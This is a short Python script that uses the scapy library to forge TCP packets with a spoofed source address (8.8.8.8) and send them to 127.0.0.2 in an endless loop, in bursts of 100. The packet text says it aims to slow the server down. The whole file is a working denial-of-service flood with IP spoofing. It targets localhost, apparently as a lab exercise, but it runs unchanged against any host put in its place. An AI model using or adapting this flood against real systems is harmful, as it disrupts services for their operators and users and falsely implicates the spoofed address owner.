from scapy.all import *

source = ["8.8.8.8", 80]
dest = ["127.0.0.2", 12000]
i = 1

while True:
    IP1 = IP(src = source[0], dst = dest[0])
    TCP1 = TCP(sport = source[1], dport = dest[1])
    data = "This is a long packet so that the server has to convert this to slow down the server more."
    pkt = IP1/TCP1/Raw(load="This is a long packet so that the server has to convert this to slow down the server more.")
    #send(pkt, inter = 0.000001)
    #pkt = IP(dst=dest[0]) / TCP(dport=dest[1]) / Raw(load=data)
    send(pkt, count=100)
    #if(i%10 == 0):
    #    print("packet sent ", i)
    i += 1

